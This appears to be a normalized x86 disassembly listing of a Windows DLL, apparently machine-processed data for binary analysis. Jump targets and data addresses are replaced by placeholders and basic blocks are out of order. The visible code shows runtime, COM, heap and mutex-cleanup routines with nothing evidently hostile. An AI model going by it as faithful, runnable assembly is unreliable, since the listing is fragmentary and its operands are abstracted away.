mov [ ebp - 0x50 ] edi
mov [ ebp - 0x60 ] dx
cmp esi edi
je r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x6
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_1003adb0
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax ]
call sub_1001bbb0
jmp r-xdata
push 0x1
call sub_10008ba0
mov ecx ebx
call sub_10047f20
jmp r-xdata
mov edi 0x8
lea ecx [ ecx ]
mov [ ebp - 0x64 ] esi
push eax
push esi
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x6
call edx
jmp r-xdata
cmp esi [ rw-data ]
jne r-xdata
add esi 0x24
cmp esi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_1005aaed
add esp 0x8
test eax eax
je r-xdata
cmp eax 0xc
jne r-xdata
xor edx edx
cmp [ rw-data ] edx
sete dl
mov [ rw-data ] edx
jmp r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_1003adb0
mov [ ebp - 0x4 ] 0x3
mov ecx [ eax ]
call sub_100475b0
jmp r-xdata
test eax eax
lea edi [ ebp - 0x68 ]
sete bl
mov [ ebp - 0x4 ] 0xffffffff
call sub_1005bb10
test bl bl
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ esi + 0x20 ]
add esi 0x1c
push esi
mov edx ebx
call sub_100084f0
jmp r-xdata
mov ecx [ ebx + 0x14 ]
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x12e
call sub_10013830
lea edx [ ebp - 0x44 ]
mov eax 0x156
call sub_10013830
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_1001a2a0
mov esi eax
test esi esi
je r-xdata
cmp esi [ rw-data ]
je r-xdata
add esi 0x24
cmp esi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_1005aaed
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x4
je r-xdata
push 0x1
call sub_1001b250
jmp r-xdata
mov ecx [ ebx ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_1001a2a0
mov esi eax
test esi esi
je r-xdata
push esi
call sub_10032fc8
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10050300
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
lea ecx [ esi + 0x20 ]
push ecx
lea ecx [ esi + 0x1c ]
mov edi ebx
call sub_100238f0
jmp r-xdata
mov ecx [ ebx + 0x10 ]
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x5
jne r-xdata
add esp 0x4
mov eax [ rw-data ]
fld [ eax + 0x118 ]
sub esp 0x8
fstp [ esp + 0x4 ]
fld [ eax + 0x114 ]
fstp [ esp ]
call sub_10049ff0
add esp 0x8
jmp r-xdata
push esi
call sub_10032fc8
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10005000
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
call sub_10014fb0
sub_10028f80
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_1006a508
call sub_1004fd6f
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_10024583
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_10029ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008032b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_10055606
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_10008030
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
test esi esi
jne r-xdata
test edi edi
je r-xdata
push 0x8007000e
call sub_10008030
sub_10029c40
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
retn
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_10029c70
push ebp
mov ebp esp
push esi
mov esi eax
cmp esi ebx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop esi
pop ebp
retn
push edi
jmp r-xdata
movzx eax [ esi ]
mov edi [ ebp + 0xc ]
push eax
call sub_10020399
mov [ edi ] ax
add [ ebp + 0xc ] 0x2
add esi 0x2
add esp 0x4
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
pop esi
pop ebp
retn
sub_10029cc0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] edx
call sub_10033c00
add esp 0x4
test eax eax
je r-xdata
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
xor eax eax
call sub_100052b0
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x20c ]
push 0x0
push ecx
call sub_10079a10
lea edx [ ebp - 0x210 ]
push edx
call sub_1003b1ca
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_1006c8f0
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov edi edi
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x210 ]
push edx
call sub_1003b1ca
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1003d910
test eax eax
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1003d910
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x21c ]
lea edx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x218 ]
push eax
call sub_1005cc50
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x4
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10029eb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008073f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ ecx + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002a500
mov ecx [ ebp + 0x20 ]
mov eax [ ecx ]
mov ebx [ ecx + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp ecx edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp eax edi
je r-xdata
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ebx
inc [ ebx ]
mov ecx [ ecx ]
mov [ ebp + 0x1c ] ecx
cmp ecx edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_100542e0
mov ecx [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ esi + 0x1c ]
cmp ecx edi
je r-xdata
mov eax ecx
call sub_100542e0
mov eax [ ebp + 0x1c ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
sub_1002a070
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100284d9
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_1002a0a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080b58
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xa
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebx + 0x12c ] 0x0
lea eax [ ebx + 0x12c ]
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebx + 0x128 ] 0x0
lea edi [ ebx + 0x128 ]
je r-xdata
push eax
call sub_10026080
cmp [ ebx + 0x130 ] 0x0
lea esi [ ebx + 0x130 ]
je r-xdata
call sub_10026dc0
cmp [ ebx + 0x138 ] 0x0
lea edi [ ebx + 0x138 ]
je r-xdata
call sub_10024550
cmp [ ebx + 0x13c ] 0x0
lea edi [ ebx + 0x13c ]
je r-xdata
call sub_1006bc40
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
call sub_1006bc40
mov eax [ ebx + 0x120 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
push eax
call [ ReleaseMutex@IAT ]
mov eax [ ebx + 0x20 ]
push eax
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x124 ]
test eax eax
je r-xdata
push eax
call esi
mov [ ebx + 0x120 ] 0x0
mov esi 0x8
cmp [ ebx + 0x118 ] esi
jb r-xdata
push eax
call esi
mov [ ebx + 0x124 ] 0x0
mov edi 0x7
xor edx edx
mov [ ebx + 0x118 ] edi
mov [ ebx + 0x114 ] 0x0
mov [ ebx + 0x104 ] dx
cmp [ ebx + 0xfc ] esi
jb r-xdata
mov ecx [ ebx + 0x104 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebx + 0xfc ] edi
mov [ ebx + 0xf8 ] 0x0
mov [ ebx + 0xe8 ] cx
cmp [ ebx + 0xe0 ] esi
jb r-xdata
mov eax [ ebx + 0xe8 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebx + 0xe0 ] edi
mov [ ebx + 0xdc ] 0x0
mov [ ebx + 0xcc ] ax
cmp [ ebx + 0xc4 ] esi
jb r-xdata
mov edx [ ebx + 0xcc ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebx + 0xc4 ] edi
mov [ ebx + 0xc0 ] 0x0
mov [ ebx + 0xb0 ] dx
cmp [ ebx + 0xa8 ] esi
jb r-xdata
mov ecx [ ebx + 0xb0 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebx + 0xa8 ] edi
mov [ ebx + 0xa4 ] 0x0
mov [ ebx + 0x94 ] cx
cmp [ ebx + 0x8c ] esi
jb r-xdata
mov eax [ ebx + 0x94 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebx + 0x8c ] edi
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x78 ] ax
cmp [ ebx + 0x70 ] esi
jb r-xdata
mov edx [ ebx + 0x78 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebx + 0x70 ] edi
mov [ ebx + 0x6c ] 0x0
mov [ ebx + 0x5c ] dx
cmp [ ebx + 0x54 ] esi
jb r-xdata
mov ecx [ ebx + 0x5c ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebx + 0x54 ] edi
mov [ ebx + 0x50 ] 0x0
mov [ ebx + 0x40 ] cx
cmp [ ebx + 0x38 ] esi
jb r-xdata
mov eax [ ebx + 0x40 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x34 ] 0x0
mov [ ebx + 0x24 ] ax
cmp [ ebx + 0x14 ] esi
jb r-xdata
mov edx [ ebx + 0x24 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx ]
push ecx
call sub_1006591f
add esp 0x4
sub_1002a350
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
mov ecx esi
call sub_10054a00
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edx
lea edx [ ebp - 0x4 ]
push edx
mov ecx esi
call sub_100016a0
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] ecx
jmp r-xdata
nop
mov ecx eax
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1002a40b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10039c8c
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1007be03
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1005e2d9
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1002a500
push ebp
mov ebp esp
push ebx
push edi
mov ebx ecx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_10055686
add esp 0x4
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x8 ] eax
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x10 ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] 0x0
sub_1002a5ec
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x7ffffffe
jbe r-xdata
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_1002c5ed
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_10050c51
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x8
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
and [ ecx + 0x10 ] esi
cmp eax 0x8
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
jae r-xdata
xor eax eax
mov [ ecx ] ax
mov ecx [ ecx ]
push eax
push 0x1
call sub_1000aecf
jmp r-xdata
mov eax esi
sub_1002a657
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10043285
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003c6eb
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_1002a720
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x10 ]
lea ecx [ eax + edi ]
cmp ecx [ esi + 0x8 ]
ja r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
push edi
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
push eax
call sub_100206e1
mov edx [ ebp + 0xc ]
push edx
push eax
call sub_10062175
jmp r-xdata
push ebx
mov ebx 0x1
test edi edi
je r-xdata
add esp 0xc
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
retn
mov [ ebp + 0x8 ] edi
nop
sub [ ebp + 0x8 ] ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
cmp ecx 0x9
jne r-xdata
add [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
jmp r-xdata
add [ esi + 0x18 ] ebx
mov edx [ esi + 0x2c ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
add eax ebx
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_10078790
jmp r-xdata
sub_1002a7d5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_10027fd7
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_100318af
test eax eax
movsx eax [ esi ]
push eax
call sub_10027fd7
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
